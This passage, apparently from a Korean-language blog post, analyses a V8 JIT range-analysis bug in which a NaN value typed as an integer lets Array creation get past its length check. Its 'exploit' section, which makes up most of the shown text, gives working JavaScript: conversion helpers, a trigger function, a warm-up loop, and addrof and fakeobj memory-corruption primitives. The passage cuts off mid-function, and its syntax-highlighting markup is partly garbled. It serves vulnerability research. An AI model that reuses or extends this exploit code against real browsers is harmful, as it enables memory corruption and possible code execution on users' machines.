  &lt;span class=&quot;n&quot;&gt;trigger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trigger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;oobê°€ ê°€ëŠ¥í•œ ì½”ë“œì´ë‹¤. &lt;code class=&quot;highlighter-rouge&quot;&gt;i&lt;/code&gt;ì— ì‹¤ì œ ê°’ì€ &lt;code class=&quot;highlighter-rouge&quot;&gt;NaN&lt;/code&gt;ì¸ë° &lt;code class=&quot;highlighter-rouge&quot;&gt;kInteger&lt;/code&gt;íƒ€ì…ìœ¼ë¡œ ë˜ì–´ìˆë‹¤. ì‹¤ì œ oob íƒ€ì…ì„ ë§Œë“œëŠ” ë³€ìˆ˜ëŠ” ì•„ë˜ ì—°ì‚°ìœ¼ë¡œ ë§Œë“¤ì–´ì§„ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// [0x100, inf]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                  &lt;span class=&quot;c1&quot;&gt;// [-inf, -0x100]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x101&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [-0x101, -0x100]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                  &lt;span class=&quot;c1&quot;&gt;// [0x100, 0x101]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;// [0x2, 0x3]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                     &lt;span class=&quot;c1&quot;&gt;// NaN &amp;gt;&amp;gt; 1 = 0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                     &lt;span class=&quot;c1&quot;&gt;// 0 + 10&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë³€ìˆ˜ rangeì˜ ë²”ìœ„ë¥¼ ì¡°ì •í•˜ì—¬ 3ë²ˆì§¸ ì¤„ì—ì„œ ë¬´ì¡°ê±´ &lt;code class=&quot;highlighter-rouge&quot;&gt;value&lt;/code&gt;ë¥¼ ì„ íƒí•˜ê²Œ ë§Œë“¤ì–´ ì‹¤ì œ rangeì™€ ê°’ì„ ë‹¤ë¥´ê²Œ ë§Œë“¤ì—ˆë‹¤. JITì´ ì ìš©ë˜ì§€ ì•Šì€ ê²½ìš°ì—ëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;NaN&lt;/code&gt;ìœ¼ë¡œ ëª¨ë‘ &lt;code class=&quot;highlighter-rouge&quot;&gt;NaN&lt;/code&gt;ì´ ë‚˜ì˜¤ë‹¤ê°€ ë°‘ì—ì„œ &lt;code class=&quot;highlighter-rouge&quot;&gt;value &amp;gt;&amp;gt;= 1&lt;/code&gt; ì—ì„œ 0ìœ¼ë¡œ ì„¸íŒ…ëœë‹¤. JITì´ ì ìš©ë˜ë©´ &lt;code class=&quot;highlighter-rouge&quot;&gt;NaN&lt;/code&gt;(0)ì¸ ê°’ì„ ê°€ì§„ì±„ë¡œ &lt;code class=&quot;highlighter-rouge&quot;&gt;value -= 0x100&lt;/code&gt;ì„ í•˜ê²Œ ë˜ì–´ ìŒìˆ˜ê°€ ë˜ëŠ”ë° &lt;code class=&quot;highlighter-rouge&quot;&gt;range&lt;/code&gt;ëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;[2, 3]&lt;/code&gt;ì´ë¼ì„œ Arrayë¥¼ ìƒì„±í•  ë•Œ ì²´í¬ë¥¼ ìš°íšŒí•˜ê²Œ ëœë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;exploit&quot;&gt;exploit&lt;/h1&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;conversion_buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ArrayBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;float_view&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Float64Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;conversion_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;int_view&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigUint64Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;conversion_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;prototype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;0x&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;prototype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i2f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;int_view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;float_view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;prototype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;smi2f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;int_view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;float_view&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[0];&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;Number&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;prototype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;f2i&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;float_view&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[0]&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;int_view&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[0];&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;Number&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;prototype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;f2smi&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;float_view&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[0]&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;int_view&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[0]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt; 32n;
}
Number.prototype.i2f = function() &lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i2f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;
Number.prototype.smi2f = function() &lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;smi2f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;

var yee2;
function trigger() &lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;Infinity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;Infinity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;Infinity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [0x100, inf]&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [-inf, -0x100]&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x101&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// [-0x101, -0x100]&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [0x100, 0x101]&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [0x2, 0x3]&lt;/span&gt;

    &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;arr2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[{},&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// yee2 = arr2;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// var b = [2.2, 2.2, 2.2, 2.2, 2.2];&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;yee2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}];&lt;/span&gt;
&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;;

trigger();

for (let i = 0; i &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;100000;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;trigger&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;yee&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;trigger&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;()[0];&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;yoff&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;0;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;addrof&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;yee2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[0]&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;yee2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[1]&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;yee&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;yoff&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;f2i&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt; 32n;
}

function fakeobj(o) &lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;yee&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;yoff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i2f&lt;/span&gt;&lt;span 